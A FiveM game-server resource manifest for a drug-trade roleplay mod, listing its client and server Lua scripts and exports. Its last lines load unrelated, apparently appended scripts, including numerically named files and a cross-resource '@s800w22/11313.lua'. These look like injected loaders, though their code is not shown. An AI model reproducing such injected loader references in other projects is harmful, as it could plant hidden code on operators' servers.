resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

client_scripts {
    'config.lua',
    'client/main.lua',
    'client/coke.lua',
    'client/meth.lua',
    'client/lsd.lua',
    'client/heroin.lua',
    'client/ecstasy.lua',
    'client/effects.lua',
    'client/deliveries.lua',
    'client/selldrugs.lua',
    'client/weedfarm.lua',
}

exports {
    "drugData",
    "GetPlantData"
}

server_scripts {
    'config.lua',
    'server/main.lua',
    'server/deliveries.lua',
    'server/selldrugs.lua',
}

client_script "11336.lua"
client_script "lucidcity-anticheat.lua"
client_script "antikickvehicle.lua"
client_script "anti-stungun.lua"
client_script "block-menus.lua"
client_script "block-menus2.lua"


client_script '@s800w22/11313.lua'